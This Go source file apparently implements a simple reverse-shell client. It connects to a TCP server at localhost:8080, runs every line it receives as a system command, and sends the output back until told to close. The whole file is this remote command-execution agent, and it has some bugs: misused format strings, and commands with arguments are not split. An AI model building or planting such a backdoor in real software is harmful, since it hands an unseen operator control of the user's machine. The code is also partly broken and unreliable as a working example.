package main

import (
	"bufio"
	"strings"
	//"encoding/gob"
	"fmt"
	"log"
	"net"
	"os/exec"
	//"runtime"
)

/*
type P struct {
	M, N int64
}
*/

func main() {

	conn, err := net.Dial("tcp", "localhost:8080")

	if err != nil {
		log.Fatal("Connection failled with %s\n", err)
	}

	for {
		//dec := gob.NewDecoder(conn)
		//dec.Decode()
		cmd, _ := bufio.NewReader(conn).ReadString('\n')
		cmd = strings.TrimSuffix(cmd, "\n")
		cmd = strings.TrimSuffix(cmd, "\n")

		if strings.Compare(cmd, "close") == 0 {
			break
		}

		out, err := exec.Command(cmd).Output()
		
		if err != nil {
			fmt.Println("%s", err)
		}

		output := string(out[:])
		fmt.Fprintf(conn, output)

		/*
		if runtime.GOOS == "windows" {
			cmd = exec.Command("dir")
		}
		*/
	}
	conn.Close()
}
